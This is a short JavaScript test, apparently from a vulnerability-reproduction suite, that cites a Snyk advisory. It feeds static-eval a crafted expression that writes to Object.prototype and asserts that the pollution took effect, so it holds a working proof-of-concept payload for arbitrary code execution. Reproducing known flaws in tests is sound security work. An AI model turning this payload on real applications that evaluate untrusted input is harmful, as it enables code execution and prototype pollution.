//https://security.snyk.io/vuln/SNYK-JS-STATICEVAL-173693
test("Arbitrary code execution in static-eval", () => {
  const evaluate = require("static-eval");
  const parse = require("esprima").parse;

  expect({}.polluted).toBe(undefined);
  let src = "(function(){1 + (Object.prototype.polluted = `yes`)}())";
  try {
    let ast = parse(src).body[0].expression;
    let res = evaluate(ast, {});
  } catch (error) {}

  expect({}.polluted).toBe("yes");
});
